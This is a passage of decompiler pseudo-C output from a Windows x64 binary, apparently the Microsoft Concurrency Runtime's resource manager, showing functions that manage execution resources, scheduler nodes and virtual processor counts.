  __int64 v6; // rbx
  _QWORD *v7; // r14
  __int64 v8; // r15
  __int64 (__fastcall ***v9)(_QWORD); // rdi
  unsigned int v10; // eax
  __int64 v11; // r8
  __int64 v12; // r9
  __int64 (__fastcall ***v13)(_QWORD); // rdi
  __int64 v14; // rax

  v6 = a1 + 64;
  sub_13F1419D8(a1 + 64);
  if ( a3 )
  {
    v7 = a2;
    v8 = a3;
    do
    {
      v9 = (__int64 (__fastcall ***)(_QWORD))*v7;
      v10 = (**(__int64 (__fastcall ***)(_QWORD))*v7)(*v7);
      v11 = 9i64 * *((unsigned int *)v9 + 21);
      v12 = *(_QWORD *)(((unsigned __int64)v10 << 6) + *(_QWORD *)(a1 + 32) + 56);
      v13 = v9 + 2;
      v14 = *(_QWORD *)(v12 + 8 * v11 + 24);
      if ( v14 )
      {
        v13[11] = *(__int64 (__fastcall ***)(_QWORD))(v14 + 88);
        v13[10] = *(__int64 (__fastcall ***)(_QWORD))(v12 + 8 * v11 + 24);
        *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v12 + 8 * v11 + 24) + 88i64) + 80i64) = v13;
        *(_QWORD *)(*(_QWORD *)(v12 + 8 * v11 + 24) + 88i64) = v13;
      }
      else
      {
        v13[11] = (__int64 (__fastcall **)(_QWORD))v13;
        v13[10] = (__int64 (__fastcall **)(_QWORD))v13;
      }
      *(_QWORD *)(v12 + 8 * v11 + 24) = v13;
      ++*(_DWORD *)(v12 + 8 * v11 + 16);
      ++v7;
      --v8;
    }
    while ( v8 );
  }
  (*(void (__fastcall **)(_QWORD, _QWORD *, _QWORD))(**(_QWORD **)(a1 + 16) + 24i64))(*(_QWORD *)(a1 + 16), a2, a3);
  *(_DWORD *)(a1 + 204) += a3;
  return sub_13F141BDC(v6);
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F151F48) ----------------------------------------------------
__int64 __fastcall sub_13F151F48(_DWORD *a1, unsigned int a2)
{
  int v4; // ecx
  unsigned int v5; // eax
  unsigned int v6; // edx
  unsigned int v7; // er10
  unsigned int v8; // eax
  int v9; // er11
  unsigned int v10; // ecx
  unsigned int v11; // er10
  unsigned int v12; // eax
  unsigned int v13; // edx

  v4 = 0;
  v5 = a1[47];
  v6 = a1[51];
  if ( v5 > v6 )
  {
    v7 = a1[48];
    v8 = v5 - v6;
    v9 = a1[53];
    if ( v9 * v7 < v8 )
      v4 = v9 + (v8 - v9 * v7) / (v7 - 1);
    else
      v4 = v8 / v7;
  }
  v10 = a1[52] + v4;
  v11 = a1[59];
  v12 = v11;
  v13 = a1[44] + a1[58];
  if ( v11 >= v13 )
    v12 = a1[44] + a1[58];
  if ( v10 >= v12 )
  {
    v10 = a1[59];
    if ( v11 >= v13 )
      v10 = a1[44] + a1[58];
  }
  if ( v10 < a2 )
    return v10;
  return a2;
}

//----- (000000013F151FD0) ----------------------------------------------------
__int64 __fastcall sub_13F151FD0(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"pContext");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 16i64))(a2);
  if ( !result )
    return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 56i64))(a1, a2);
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F151FD0: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F15203C) ----------------------------------------------------
__int64 __fastcall sub_13F15203C(__int64 a1)
{
  unsigned int i; // er14
  __int64 v3; // r15
  unsigned __int64 v4; // rsi
  __int64 v5; // rdi
  __int64 v6; // rbx
  __int64 v7; // rbx

  for ( i = 0; i < *(_DWORD *)(a1 + 240); ++i )
  {
    v3 = 0i64;
    v4 = *(_QWORD *)(a1 + 32) + ((unsigned __int64)i << 6);
    if ( *(_DWORD *)(v4 + 8) )
    {
      do
      {
        v5 = *(_QWORD *)(*(_QWORD *)(v4 + 56) + 72 * v3 + 24);
        if ( v5 )
          v5 = *(_QWORD *)(v5 + 88);
        while ( v5 )
        {
          v6 = v5;
          if ( v5 == *(_QWORD *)(*(_QWORD *)(v4 + 56) + 72 * v3 + 24) )
            v5 = 0i64;
          else
            v5 = *(_QWORD *)(v5 + 88);
          v7 = *(_QWORD *)(v6 + 48);
          sub_13F15B450(v7);
          (*(void (__fastcall **)(__int64))(*(_QWORD *)v7 + 72i64))(v7);
        }
        v3 = (unsigned int)(v3 + 1);
      }
      while ( (unsigned int)v3 < *(_DWORD *)(v4 + 8) );
    }
  }
  return sub_13F14088C(*(_QWORD *)(a1 + 104), 2104i64);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F152110) ----------------------------------------------------
__int64 __fastcall sub_13F152110(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v6; // rax
  __int64 v7; // rbx

  v6 = sub_13F14059C(96i64);
  v7 = 0i64;
  if ( v6 )
    v7 = sub_13F150F08(v6, a1, a2, a3);
  sub_13F151064(v7);
  return v7;
}

//----- (000000013F152180) ----------------------------------------------------
__int64 __fastcall sub_13F152180(_QWORD *a1, _QWORD *a2)
{
  char *v4; // rdi
  unsigned __int64 v5; // rsi
  __int64 v6; // rdi
  __int64 v7; // rbp
  __int64 v8; // r9
  __int64 v9; // rdx
  __int64 v10; // rax
  __int64 pExceptionObject[6]; // [rsp+38h] [rbp-30h] BYREF

  v4 = sub_13F15F76C(
         a2,
         0,
         (__int64)&Concurrency::IExecutionResource `RTTI Type Descriptor',
         (__int64)&Concurrency::details::ExecutionResource `RTTI Type Descriptor',
         0);
  if ( !v4 )
  {
    v4 = (char *)(a2 + 2);
    if ( (_QWORD *)a2[6] != a1 )
    {
      sub_13F1097A8(pExceptionObject, (__int64)"pExecutionResource");
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
    }
  }
  sub_13F1419D8(a1 + 8);
  v5 = a1[4] + ((unsigned __int64)*((unsigned int *)v4 + 16) << 6);
  v6 = *((unsigned int *)v4 + 17);
  v7 = (*(__int64 (__fastcall **)(_QWORD *, unsigned __int64, _QWORD))(*a1 + 48i64))(a1, v5, (unsigned int)v6);
  *(_BYTE *)(v7 + 113) = 1;
  v8 = *(_QWORD *)(v5 + 56);
  v9 = v7 + 16;
  v10 = *(_QWORD *)(v8 + 72 * v6 + 24);
  if ( v10 )
  {
    *(_QWORD *)(v7 + 104) = *(_QWORD *)(v10 + 88);
    *(_QWORD *)(v7 + 96) = *(_QWORD *)(v8 + 72 * v6 + 24);
    *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v8 + 72 * v6 + 24) + 88i64) + 80i64) = v9;
    *(_QWORD *)(*(_QWORD *)(v8 + 72 * v6 + 24) + 88i64) = v9;
  }
  else
  {
    *(_QWORD *)(v7 + 104) = v7 + 16;
    *(_QWORD *)(v7 + 96) = v7 + 16;
  }
  *(_QWORD *)(v8 + 72 * v6 + 24) = v9;
  ++*(_DWORD *)(v8 + 72 * v6 + 16);
  sub_13F141BDC(a1 + 8);
  return v7;
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F152180: using guessed type _QWORD pExceptionObject[6];

//----- (000000013F1522A8) ----------------------------------------------------
_QWORD *__fastcall sub_13F1522A8(__int64 a1, __int64 a2, unsigned int a3)
{
  _QWORD *v6; // rcx
  _QWORD *result; // rax

  v6 = (_QWORD *)sub_13F14059C(144i64);
  result = 0i64;
  if ( v6 )
    return sub_13F15B494(v6, a1, a2, a3);
  return result;
}

//----- (000000013F152304) ----------------------------------------------------
__int64 __fastcall sub_13F152304(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v3; // r8

  result = (unsigned int)_InterlockedExchangeAdd(
                           (volatile signed __int32 *)(*(_QWORD *)(((unsigned __int64)*(unsigned int *)(a2 + 64) << 6)
                                                                 + *(_QWORD *)(a1 + 32)
                                                                 + 56)
                                                     + 72i64 * *(unsigned int *)(a2 + 68)
                                                     + 40),
                           0xFFFFFFFF);
  if ( (_DWORD)result == 1 )
  {
    result = *(unsigned int *)(a1 + 176);
    v3 = *(_QWORD *)(a1 + 24);
    if ( *(_DWORD *)(v3 + 20) > (unsigned int)(*(_DWORD *)(a1 + 180) == (_DWORD)result) )
      return MEMORY[0x76F833A0](*(_QWORD *)(v3 + 112));
  }
  return result;
}

//----- (000000013F15235C) ----------------------------------------------------
__int64 __fastcall sub_13F15235C(__int64 a1, unsigned int a2, unsigned int a3, char a4)
{
  unsigned __int64 v5; // r14
  __int64 v7; // rdi
  __int64 result; // rax
  __int64 v9; // rsi
  __int64 v11; // rdx
  __int64 v12; // rdx

  v5 = (unsigned __int64)a2 << 6;
  v7 = 9i64 * a3;
  result = *(_QWORD *)(a1 + 32);
  v9 = *(_QWORD *)(result + v5 + 56);
  if ( a4 )
  {
    --*(_DWORD *)(v9 + 72i64 * a3 + 60);
    --*(_DWORD *)(a1 + 228);
  }
  if ( (*(_DWORD *)(v9 + 72i64 * a3 + 56))-- == 1 )
  {
    v11 = *(_QWORD *)(a1 + 32);
    --*(_DWORD *)(a1 + 220);
    v12 = v5 + v11;
    --*(_DWORD *)(v12 + 44);
    if ( *(_BYTE *)(v9 + 72i64 * a3 + 66) )
    {
      result = sub_13F152F78(a1, v12, a3);
      *(_BYTE *)(v9 + 8 * v7 + 66) = 0;
    }
    if ( a4 )
    {
      result = *(_QWORD *)(a1 + 32);
      if ( !*(_DWORD *)(*(_QWORD *)(result + v5 + 56) + 8 * v7 + 52) )
        --*(_DWORD *)(a1 + 232);
    }
  }
  return result;
}

//----- (000000013F152408) ----------------------------------------------------
__int64 __fastcall sub_13F152408(_QWORD *a1)
{
  __int64 result; // rax

  if ( a1 )
  {
    sub_13F151BF8(a1);
    return sub_13F14088C(a1, 272i64);
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F152430) ----------------------------------------------------
__int64 __fastcall sub_13F152430(__int64 a1, __int64 a2)
{
  unsigned __int64 v4; // rdx
  __int64 v5; // rsi
  __int64 v6; // r14
  __int64 v7; // rdx
  __int64 v8; // rax
  __int64 v9; // rax

  v4 = *(_QWORD *)(a1 + 32) + ((unsigned __int64)*(unsigned int *)(a2 + 64) << 6);
  v5 = 9i64 * *(unsigned int *)(a2 + 68);
  v6 = *(_QWORD *)(v4 + 56);
  if ( !(*(_DWORD *)(v6 + 72i64 * *(unsigned int *)(a2 + 68) + 52)
       + *(_DWORD *)(v6 + 72i64 * *(unsigned int *)(a2 + 68) + 60)) )
  {
    --*(_DWORD *)(v4 + 36);
    *(_DWORD *)(v6 + 8 * v5) = 1;
    --*(_DWORD *)(a1 + 208);
    v7 = *(_QWORD *)(((unsigned __int64)*(unsigned int *)(a2 + 64) << 6) + *(_QWORD *)(*(_QWORD *)(a1 + 24) + 96i64) + 48)
       + 48i64 * *(unsigned int *)(a2 + 68);
    --*(_DWORD *)(v7 + 24);
  }
  sub_13F1419D8(a1 + 64);
  --*(_DWORD *)(v6 + 8 * v5 + 16);
  *(_QWORD *)(*(_QWORD *)(a2 + 88) + 80i64) = *(_QWORD *)(a2 + 80);
  *(_QWORD *)(*(_QWORD *)(a2 + 80) + 88i64) = *(_QWORD *)(a2 + 88);
  v8 = *(_QWORD *)(v6 + 8 * v5 + 24);
  if ( a2 == v8 )
  {
    if ( v8 == *(_QWORD *)(v8 + 88) )
      v9 = 0i64;
    else
      v9 = *(_QWORD *)(v8 + 80);
    *(_QWORD *)(v6 + 8 * v5 + 24) = v9;
  }
  sub_13F141BDC(a1 + 64);
  *(_QWORD *)a2 = &Concurrency::details::ExecutionResource::`vftable';
  return sub_13F14088C(a2, 96i64);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F18B020: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (000000013F15252C) ----------------------------------------------------
__int64 __fastcall sub_13F15252C(__int64 a1, __int64 a2)
{
  __int64 v4; // rbx
  unsigned int v5; // eax
  __int64 v6; // r8
  __int64 v7; // r9
  __int64 v8; // rax
  __int64 v9; // rax

  v4 = a1 + 64;
  sub_13F1419D8(a1 + 64);
  v5 = (**(__int64 (__fastcall ***)(__int64))a2)(a2);
  v6 = 9i64 * *(int *)(a2 + 84);
  v7 = *(_QWORD *)(*(_QWORD *)(a1 + 32) + ((unsigned __int64)v5 << 6) + 56);
  --*(_DWORD *)(v7 + 8 * v6 + 16);
  *(_QWORD *)(*(_QWORD *)(a2 + 104) + 80i64) = *(_QWORD *)(a2 + 96);
  *(_QWORD *)(*(_QWORD *)(a2 + 96) + 88i64) = *(_QWORD *)(a2 + 104);
  v8 = *(_QWORD *)(v7 + 8 * v6 + 24);
  if ( a2 + 16 == v8 )
  {
    if ( v8 == *(_QWORD *)(v8 + 88) )
      v9 = 0i64;
    else
      v9 = *(_QWORD *)(v8 + 80);
    *(_QWORD *)(v7 + 8 * v6 + 24) = v9;
  }
  if ( !*(_BYTE *)(a2 + 113) )
    --*(_DWORD *)(a1 + 204);
  sub_13F141BDC(v4);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 72i64))(a2);
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1525F4) ----------------------------------------------------
__int64 __fastcall sub_13F1525F4(__int64 a1)
{
  sub_13F15203C(a1);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 72i64))(a1);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F152618) ----------------------------------------------------
__int64 __fastcall sub_13F152618(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rax

  v1 = 0i64;
  v2 = sub_13F142818(*(unsigned int *)(*(_QWORD *)(a1 + 24) + 176i64));
  if ( v2 && (v2 & 3) == 0 )
    return v2;
  return v1;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);

//----- (000000013F152644) ----------------------------------------------------
__int64 __fastcall sub_13F152644(__int64 a1, __int64 a2)
{
  __int64 (__fastcall ***v4)(_QWORD, _QWORD, _QWORD); // rcx
  __int64 v5; // rbx

  v4 = *(__int64 (__fastcall ****)(_QWORD, _QWORD, _QWORD))(a1 + 8);
  if ( !v4 )
  {
    v4 = (__int64 (__fastcall ***)(_QWORD, _QWORD, _QWORD))sub_13F153AA0(*(_QWORD *)(a1 + 24) + 160i64);
    *(_QWORD *)(a1 + 8) = v4;
  }
  v5 = (**v4)(v4, *(unsigned int *)(a1 + 196), *(unsigned int *)(a1 + 200));
  sub_13F15B9FC(v5, a2);
  return v5;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1526AC) ----------------------------------------------------
__int64 __fastcall sub_13F1526AC(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rbx

  if ( *(_QWORD *)(a2 + 32) == a1 )
    return a2;
  v4 = sub_13F14059C(96i64);
  v5 = 0i64;
  if ( v4 )
    v5 = sub_13F150F6C(v4, a1, (_DWORD *)a2);
  sub_13F151064(v5);
  return v5;
}

//----- (000000013F152718) ----------------------------------------------------
__int64 __fastcall sub_13F152718(__int64 a1, unsigned int a2, __int64 a3, char a4)
{
  __int64 v4; // rbx
  unsigned int v5; // er15
  unsigned int v8; // edx
  int v9; // er8
  unsigned int v10; // eax
  int v11; // er10
  int v12; // ecx
  unsigned int v13; // er10
  unsigned int v14; // esi
  __int64 v15; // r14
  unsigned int v16; // er13
  unsigned int v17; // ecx
  int v18; // ebp
  unsigned int v19; // ebp
  unsigned __int128 v20; // rax
  unsigned int v21; // ebp
  char v22; // r9
  unsigned int v23; // er12
  unsigned int v24; // er11
  unsigned __int64 v25; // r15
  unsigned int v26; // er10
  unsigned int v27; // er8
  __int64 v28; // rsi
  __int64 v29; // rdx
  char v30; // al
  char v31; // r11
  int v32; // eax
  int v33; // esi
  unsigned int v34; // er14
  __int64 v35; // rcx
  __int64 v36; // rax
  unsigned int v37; // eax
  char v38; // al
  __int64 v39; // rdx
  char v41; // [rsp+20h] [rbp-78h]
  char v42; // [rsp+21h] [rbp-77h]
  int v43; // [rsp+24h] [rbp-74h]
  unsigned int v44; // [rsp+28h] [rbp-70h]
  int v45; // [rsp+2Ch] [rbp-6Ch]
  unsigned int i; // [rsp+30h] [rbp-68h]
  unsigned int v47; // [rsp+34h] [rbp-64h]
  unsigned int v48; // [rsp+38h] [rbp-60h]
  unsigned int v49; // [rsp+3Ch] [rbp-5Ch]
  unsigned int v50; // [rsp+40h] [rbp-58h]
  unsigned int v51; // [rsp+44h] [rbp-54h]
  char v52; // [rsp+48h] [rbp-50h]
  _QWORD *v53; // [rsp+50h] [rbp-48h]
  __int64 v54; // [rsp+58h] [rbp-40h]

  v4 = 0i64;
  v5 = a2;
  v45 = 0;
  v8 = 0;
  if ( a4 )
  {
    v9 = *(_DWORD *)(a1 + 232);
    v10 = *(_DWORD *)(a1 + 180);
    v11 = *(_DWORD *)(a1 + 220);
    v12 = *(_DWORD *)(a1 + 208);
    v13 = v11 - v9;
    if ( v13 <= v10 )
      v13 = v10;
    LOBYTE(v8) = v5 + v12 > v9 + v13;
    v44 = v8;
  }
  else
  {
    v44 = 0;
  }
  v14 = v8 < v5 ? v5 - v8 : 0;
  if ( !v8 || (v42 = 1, v5) )
    v42 = 0;
  if ( !a4 || (v41 = 1, v8) )
    v41 = 0;
  v15 = 0i64;
  v50 = -1;
  v16 = -1;
  if ( a4 )
    v43 = sub_13F145234(*(_QWORD *)(a1 + 24), 0i64);
  else
    v43 = -1;
  v47 = 0;
  if ( v14
    && ((v17 = *(_DWORD *)(a1 + 212), v18 = *(_DWORD *)(a1 + 192), v14 > v17) ? (v19 = (v18 - 1) * (v14 - v17)
                                                                                     + v17 * v18) : (v19 = v14 * v18),
        (v47 = v19) != 0) )
  {
    v20 = v19 * (unsigned __int128)8ui64;
    if ( !is_mul_ok(v19, 8ui64) )
      *(_QWORD *)&v20 = -1i64;
    v53 = (_QWORD *)sub_13F1790C4(v20, *((_QWORD *)&v20 + 1));
  }
  else
  {
    v53 = 0i64;
  }
  v21 = v44;
  v49 = 0;
  v22 = a4 ^ 1;
  v23 = 0;
  v24 = 0;
  while ( 1 )
  {
    v51 = v23;
    if ( v24 >= v5 )
    {
      if ( v22 )
        break;
    }
    if ( v23 >= *(_DWORD *)(a1 + 240) )
      break;
    v25 = *(_QWORD *)(a1 + 32) + ((unsigned __int64)v23 << 6);
    if ( *(_DWORD *)(v25 + 32) || *(_DWORD *)(v25 + 36) )
    {
      v26 = a2;
      v27 = 0;
      for ( i = 0; ; i = v27 )
      {
        v48 = v16;
        v28 = v15;
        if ( v24 >= v26 && v22 || v27 >= *(_DWORD *)(v25 + 8) )
        {
          *(_DWORD *)(v25 + 32) = 0;
          goto LABEL_73;
        }
        v29 = *(_QWORD *)(v25 + 56);
        if ( *(_DWORD *)(v29 + 72i64 * v27) == 3 )
          break;
        if ( *(_DWORD *)(v29 + 72i64 * v27) != 4 )
          goto LABEL_71;
        if ( v41 )
        {
          v37 = *(_DWORD *)(v29 + 72i64 * v27 + 52) + *(_DWORD *)(v29 + 72i64 * v27 + 60);
          if ( v37 < v50 || v37 == v50 && v23 == v43 )
          {
            v50 = *(_DWORD *)(v29 + 72i64 * v27 + 52) + *(_DWORD *)(v29 + 72i64 * v27 + 60);
LABEL_70:
            v16 = v27;
            v15 = v25;
          }
        }
        else if ( v42 && !*(_DWORD *)(v29 + 72i64 * v27 + 56) && (!v15 || v23 == v43) )
        {
          v38 = v22;
          if ( v23 == v43 )
            v38 = 1;
          v22 = v38;
          goto LABEL_70;
        }
LABEL_71:
        ++v27;
      }
      if ( !v22 && (v24 == v26 - 1 || v43 == v23) )
      {
        v30 = 1;
        if ( v21 )
        {
          v31 = 0;
LABEL_42:
          *(_DWORD *)(v29 + 72i64 * v27) = 4;
          v16 = v27;
          ++*(_DWORD *)(v25 + 36);
          ++*(_DWORD *)(a1 + 208);
          if ( !v30 )
            v16 = v48;
          if ( v30 )
            v22 = 1;
          v15 = v25;
          v52 = v22;
          if ( !v30 )
            v15 = v28;
          v54 = v15;
          if ( v31 )
          {
            v32 = *(_DWORD *)(a1 + 212);
            v33 = *(_DWORD *)(a1 + 192);
            if ( v32 )
              *(_DWORD *)(a1 + 212) = v32 - 1;
            else
              --v33;
            *(_DWORD *)(v29 + 72i64 * v27 + 52) += v33;
            *(_DWORD *)(a1 + 224) += v33;
            if ( v33 )
            {
              v34 = v49;
              do
              {
                v35 = (*(__int64 (__fastcall **)(__int64, unsigned __int64, _QWORD))(*(_QWORD *)a1 + 48i64))(a1, v25, i);
                v36 = v34++;
                v53[v36] = v35;
                --v33;
              }
              while ( v33 );
              v23 = v51;
              v21 = v44;
              v27 = i;
              v22 = v52;
              v26 = a2;
              v49 = v34;
              v15 = v54;
            }
          }
          v24 = ++v45;
          goto LABEL_71;
        }
      }
      else
      {
        v30 = 0;
      }
      v31 = 1;
      goto LABEL_42;
    }
LABEL_73:
    v5 = a2;
    ++v23;
  }
  if ( v47 )
  {
    sub_13F151E48(a1, v53, v47);
    sub_13F14088C(v53, v39);
  }
  if ( a4 )
  {
    if ( !v41 && v42 )
    {
      sub_13F152CDC(a1, v15, v16);
      *(_DWORD *)(*(_QWORD *)(v15 + 56) + 72i64 * v16) = 4;
      ++*(_DWORD *)(v15 + 36);
      ++*(_DWORD *)(a1 + 208);
    }
    return sub_13F152110(a1, v15, v16);
  }
  return v4;
}
// 13F152A91: variable 'v39' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F152B08) ----------------------------------------------------
__int64 __fastcall sub_13F152B08(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  __int64 v3; // r8

  result = (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(*(_QWORD *)(((unsigned __int64)*(unsigned int *)(a2 + 64) << 6)
                                                                                     + *(_QWORD *)(a1 + 32)
                                                                                     + 56)
                                                                         + 72i64 * *(unsigned int *)(a2 + 68)
                                                                         + 40));
  if ( (_DWORD)result == 1 )
  {
    result = *(unsigned int *)(a1 + 176);
    v3 = *(_QWORD *)(a1 + 24);
    if ( *(_DWORD *)(v3 + 20) > (unsigned int)(*(_DWORD *)(a1 + 180) == (_DWORD)result) )
      return MEMORY[0x76F833A0](*(_QWORD *)(v3 + 112));
  }
  return result;
}

//----- (000000013F152B64) ----------------------------------------------------
__int64 __fastcall sub_13F152B64(__int64 a1, unsigned int a2, unsigned int a3, char a4)
{
  unsigned __int64 v6; // r14
  __int64 v7; // rdi
  __int64 v8; // rsi
  int v9; // edx
  __int64 result; // rax
  __int64 v11; // rdx

  v6 = (unsigned __int64)a2 << 6;
  v7 = 9i64 * a3;
  v8 = *(_QWORD *)(*(_QWORD *)(a1 + 32) + v6 + 56);
  v9 = *(_DWORD *)(v8 + 72i64 * a3 + 56);
  result = (unsigned int)(v9 + 1);
  *(_DWORD *)(v8 + 72i64 * a3 + 56) = result;
  if ( v9 )
  {
LABEL_7:
    if ( a4 )
    {
      ++*(_DWORD *)(a1 + 228);
      ++*(_DWORD *)(v8 + 8 * v7 + 60);
    }
    return result;
  }
  v11 = v6 + *(_QWORD *)(a1 + 32);
  ++*(_DWORD *)(v11 + 44);
  ++*(_DWORD *)(a1 + 220);
  if ( *(_BYTE *)(v8 + 72i64 * a3 + 65) )
  {
    *(_BYTE *)(v8 + 72i64 * a3 + 66) = 1;
    result = sub_13F152F78(a1, v11, a3);
  }
  if ( a4 )
  {
    result = *(_QWORD *)(a1 + 32);
    if ( !*(_DWORD *)(*(_QWORD *)(result + v6 + 56) + 8 * v7 + 52) )
      ++*(_DWORD *)(a1 + 232);
    goto LABEL_7;
  }
  return result;
}

//----- (000000013F152C10) ----------------------------------------------------
__int64 __fastcall sub_13F152C10(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  int v4; // eax
  __int64 v5; // rax
  unsigned __int64 v6; // rbx
  unsigned __int64 v7; // rdi
  __int64 v8; // rbx
  __int64 v9; // rax

  v2 = sub_13F142818(*(unsigned int *)(*(_QWORD *)(a1 + 24) + 176i64));
  v3 = v2;
  if ( !v2 )
    return 0i64;
  v4 = v2 & 3;
  if ( !v4 )
  {
LABEL_6:
    sub_13F151064(v3);
    goto LABEL_12;
  }
  if ( v4 == 1i64 )
  {
    v3 = *(_QWORD *)((v3 & 0xFFFFFFFFFFFFFFFEui64) + 32) + 16i64;
    v5 = *(_QWORD *)(v3 + 48);
    if ( v5 && *(_BYTE *)(v5 + 112) )
      return 0i64;
    goto LABEL_6;
  }
  v6 = v3 & 0xFFFFFFFFFFFFFFFDui64;
  v7 = v6 + 8;
  (*(void (__fastcall **)(unsigned __int64))(*(_QWORD *)(v6 + 8) + 32i64))(v6 + 8);
  v8 = *(_QWORD *)(v6 + 64);
  v9 = *(_QWORD *)(v8 + 80);
  v3 = v8 + 32;
  if ( v9 && *(_BYTE *)(v9 + 112) )
    v3 = 0i64;
  else
    sub_13F151064(v3);
  (*(void (__fastcall **)(unsigned __int64))(*(_QWORD *)v7 + 40i64))(v7);
LABEL_12:
  if ( v3 )
    return sub_13F1526AC(a1, v3);
  return 0i64;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F152CDC) ----------------------------------------------------
__int64 __fastcall sub_13F152CDC(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v4; // rsi
  __int64 v5; // r14
  int v6; // eax
  __int64 v7; // rax
  __int64 v8; // rbp
  __int64 v9; // rcx
  __int64 v11; // [rsp+50h] [rbp+8h] BYREF
  __int64 v12; // [rsp+58h] [rbp+10h]

  --*(_DWORD *)(a2 + 36);
  --*(_DWORD *)(a1 + 208);
  v4 = 9i64 * a3;
  v5 = *(_QWORD *)(a2 + 56);
  *(_DWORD *)(v5 + 72i64 * a3) = 1;
  v6 = *(_DWORD *)(v5 + 72i64 * a3 + 52);
  if ( v6 == *(_DWORD *)(a1 + 192) )
  {
    ++*(_DWORD *)(a1 + 212);
    v6 = *(_DWORD *)(v5 + 72i64 * a3 + 52);
  }
  *(_DWORD *)(a1 + 224) -= v6;
  *(_DWORD *)(v5 + 72i64 * a3 + 52) = 0;
  if ( *(_BYTE *)(v5 + 72i64 * a3 + 65) )
    sub_13F152F78(a1, a2, a3);
  *(_BYTE *)(v5 + 8 * v4 + 64) = 0;
  v12 = a1 + 64;
  sub_13F1419D8(a1 + 64);
  v7 = *(_QWORD *)(v5 + 8 * v4 + 24);
  if ( v7 )
    v7 = *(_QWORD *)(v7 + 88);
  if ( v7 )
  {
    do
    {
      if ( v7 == *(_QWORD *)(v5 + 8 * v4 + 24) )
        v8 = 0i64;
      else
        v8 = *(_QWORD *)(v7 + 88);
      v9 = *(_QWORD *)(v7 + 48);
      if ( v9 && !*(_BYTE *)(v9 + 112) )
      {
        *(_BYTE *)(v9 + 112) = 1;
        v11 = v9;
        (*(void (__fastcall **)(_QWORD, __int64 *, __int64))(**(_QWORD **)(a1 + 16) + 32i64))(
          *(_QWORD *)(a1 + 16),
          &v11,
          1i64);
      }
      v7 = v8;
    }
    while ( v8 );
  }
  return sub_13F141BDC(a1 + 64);
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F152DE0) ----------------------------------------------------
__int64 __fastcall sub_13F152DE0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rax
  __int64 v3; // rax

  --*(_DWORD *)(a1 + 248);
  *(_QWORD *)(a2[11] + 80i64) = a2[10];
  *(_QWORD *)(a2[10] + 88i64) = a2[11];
  v2 = *(_QWORD **)(a1 + 256);
  if ( a2 == v2 )
  {
    if ( v2 == (_QWORD *)v2[11] )
      v3 = 0i64;
    else
      v3 = v2[10];
    *(_QWORD *)(a1 + 256) = v3;
  }
  *a2 = &Concurrency::details::ExecutionResource::`vftable';
  return sub_13F14088C(a2, 96i64);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
